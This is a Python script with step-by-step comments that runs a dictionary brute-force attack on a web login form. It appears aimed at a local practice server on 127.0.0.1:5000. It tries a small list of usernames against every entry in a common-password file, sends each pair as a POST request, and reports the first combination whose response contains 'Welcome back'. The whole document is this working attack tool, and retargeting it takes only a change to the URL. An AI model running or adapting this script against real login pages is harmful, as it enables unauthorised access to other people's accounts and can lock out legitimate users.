import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
response = "Welcome back"

#Do the following as many times as the number of username in the usernames list
for username in usernames:
  # read from the external passwords txt file and save the text inside as passwords_list
  with open(passwords, "r") as passwords_list:
    #read each password and for every password in the list of passwords_list do the followings
    for password in passwords_list:
      #stripp the new line char at the end and encode it in byte character for network transmission
      password = password.strip("\n").encode()
      #write the current username and password that is bruteforcing to terminal
      sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
      #flshing buffer = pushing the line to console/terminal immediatly before the next line overwrites it
      sys.stdout.flush()
      #send a post request with the current username and password with the post() to the website and store the response in r object
      r = requests.post(target, data={"username": username, "password": password})
      #check if the response "Welcome back" exist inside the body of the http response (case sensitive and also send in byte form), 
      #if true then print out the associate username and password and exit the loop
      if response.encode() in r.content:
        sys.stdout.write("\n")
        sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username))
        sys.exit()
    sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.write("\tNo password found for '{}'!".format(username))


